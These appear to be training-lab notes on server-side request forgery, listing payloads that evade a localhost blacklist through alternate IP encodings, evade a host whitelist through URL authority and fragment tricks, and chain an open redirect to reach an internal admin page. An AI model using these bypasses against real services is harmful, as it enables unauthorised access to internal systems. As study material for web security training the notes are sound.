# Section 18: SSRF - Bypassing Security

## Bypassing Blacklists

same stockApi ➡️ Send to the Repeater ➡️ modify URL

```
stockApi=http://localhost/
```

Error:

_External stock check blocked for security reasons_

A possible implementation to prevent unauthorized requests is with a **black list** (If request in blacklist then block it)

### Other ways to refer to localhost:

```
lOcaLHost
127.0.0.1
127.1
017700000001
0x7f000001
2130707433
```

```
stockApi=http://lOcaLHost/
```

```
stockApi=http://127.1/
```

Other options
- URL-encode all characters
- double encode it
- register a domain, which is not going to be in the blacklist, and have that resolved to 127.0.0.1

now the admin page is being displayed

---

## Bypassing Whitelists

same stockApi ➡️ Send to the Repeater ➡️ modify URL

```
stockApi=http://localhost/
```

Error:

_External stock check host must be stock.weliketoshop.net_

First try previous approach, but the target is using a whitelist (list of words that can only be sent)

**Send a request that contains this domain:**

```
stockApi=http://stock.weliketopshop.net/
```

Error:

_Could not connect to external stock check service_

**Login as user to the service**

```
stockApi=http://zaid@stock.weliketopshop.net/
```

same error

**Exploit authority in the URL**

also double URL encode the hash symbol

```
stockApi=http://localhost#@stock.weliketopshop.net/
```

now we can see the admin page

> rfc3986, how parsers process URL

---

## Chaining Open Redirection with SSRF to Bypass Restrictive Filters

same stockApi ➡️ Send to the Repeater ➡️ modify URL ➡️ URL decode

```
stockApi=/product/stock/check?productId=4&storeId=1
```

**Try localhost**

```
stockApi=http://localhost/
```

Error:

_Invalid external stock check url 'Invalid URL'_

But found that a next link URL has a similar path with path the product and productId

**URL in the same domain + load a product + redirect to localhost**

```
stockApi=https://ac5a1ff21e4de571c.web-security-academy.net/product/nextProduct?currentProductId=4&path=http://localhost/
```


Error:

_Invalid external stock check url 'Invalid URL'_

Now try:

```
stockApi=/product/nextProduct?currentProductId=4&path=http://localhost/
```

Error:

_Missing parameter 'path'_

Now try:

```
stockApi=/product/nextProduct?path=http://localhost/
```

now we get the admin page in the localhost

---

